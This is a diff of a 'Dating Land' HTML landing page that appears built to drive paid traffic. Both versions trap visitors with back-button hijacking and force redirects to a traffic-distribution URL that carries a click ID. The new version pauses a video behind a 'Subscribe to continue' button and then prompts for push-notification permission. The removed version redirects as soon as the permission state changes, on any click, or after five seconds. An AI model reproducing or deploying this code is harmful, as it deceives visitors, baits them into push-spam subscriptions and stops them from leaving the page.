@@ -1,65 +1,99 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dating Land</title>
-    <script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>
-    <script>
-        // 1. Collect parameters from URL (clickid from Binom and others)
-        const urlParams = new URLSearchParams(window.location.search);
-        const clickId = urlParams.get('clickid') || '';
-        
-        // Target URL where we send the user (Offer URL)
-        const targetUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;
-        
-        // 2. Redirect function
-        function doRedirect() {
-            window.location.replace(targetUrl);
-        }
-        
-        // 3. Back Button setup
-        (function() {
-            var backUrl = targetUrl;
-            history.pushState(null, null, location.href);
-            window.onpopstate = function() {
-                history.go(1);
-                window.location.replace(backUrl);
-            };
-        })();
-        
-        // 4. Detect push notification interaction
-        window.addEventListener('load', function() {
-            // Monitor for permission changes (accept/deny)
-            var originalPermission = Notification.permission;
-            
-            // Check every 100ms if permission changed
-            var checkInterval = setInterval(function() {
-                if (Notification.permission !== originalPermission) {
-                    clearInterval(checkInterval);
-                    doRedirect(); // Instant redirect on any choice
-                }
-            }, 100);
-            
-            // Fallback: redirect after 5 seconds if no interaction
-            setTimeout(function() {
-                clearInterval(checkInterval);
-                doRedirect();
-            }, 5000);
-        });
-    </script>
-    <style>
-        body {
-            background-color: #000000;
-            color: #ffffff;
-            margin: 0;
-            padding: 0;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dating Land</title>
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        overflow: hidden;
+        background-color: #000;
+        font-family: Arial, sans-serif;
+    }
+    #videoContainer {
+        position: relative;
+        width: 100%;
+        height: 100%;
+    }
+    #myVideo {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+    #subscribeBtn {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%) scale(0);
+        padding: 20px 40px;
+        font-size: 28px;
+        color: #fff;
+        background-color: rgba(255, 0, 150, 0.85);
+        border: 2px solid #fff;
+        border-radius: 12px;
+        cursor: pointer;
+        z-index: 2;
+        transition: transform 0.5s ease, opacity 0.5s ease;
+        opacity: 0;
+    }
+    #subscribeBtn.show {
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 1;
+    }
+</style>
 </head>
-<body onclick="doRedirect();"> 
-    <div style="height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif;">
-        <h1>Please wait, loading content...</h1>
-    </div>
+<body>
+<div id="videoContainer">
+    <video id="myVideo" autoplay muted playsinline>
+        <source src="https://drive.google.com/uc?export=download&id=1vQyzBuAsTze-RdFdAWAoWgltiQNetNTs" type="video/mp4">
+        Your browser does not support HTML5 video.
+    </video>
+    <div id="subscribeBtn">Subscribe to continue</div>
+</div>
+
+<script>
+const video = document.getElementById('myVideo');
+const btn = document.getElementById('subscribeBtn');
+const urlParams = new URLSearchParams(window.location.search);
+const clickId = urlParams.get('clickid') || '';
+const targetUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;
+
+// 1. Пауза видео через 1 сек и показать кнопку с анимацией
+video.addEventListener('loadeddata', () => {
+    setTimeout(() => {
+        video.pause();
+        btn.classList.add('show');
+
+        // 2. Push уведомление через 2.5 сек после паузы
+        setTimeout(() => {
+            if ('Notification' in window) {
+                Notification.requestPermission();
+            }
+        }, 2500);
+
+    }, 1000);
+});
+
+// 3. Клик по видео или кнопке — продолжить видео и редирект
+function continueAndRedirect() {
+    btn.classList.remove('show');
+    video.play();
+    setTimeout(() => {
+        window.location.replace(targetUrl);
+    }, 3000); // редирект через 3 сек после возобновления видео
+}
+
+video.addEventListener('click', continueAndRedirect);
+btn.addEventListener('click', continueAndRedirect);
+
+// 4. Back button protection
+history.pushState(null, null, location.href);
+window.onpopstate = function() {
+    history.go(1);
+};
+</script>
 </body>
 </html>
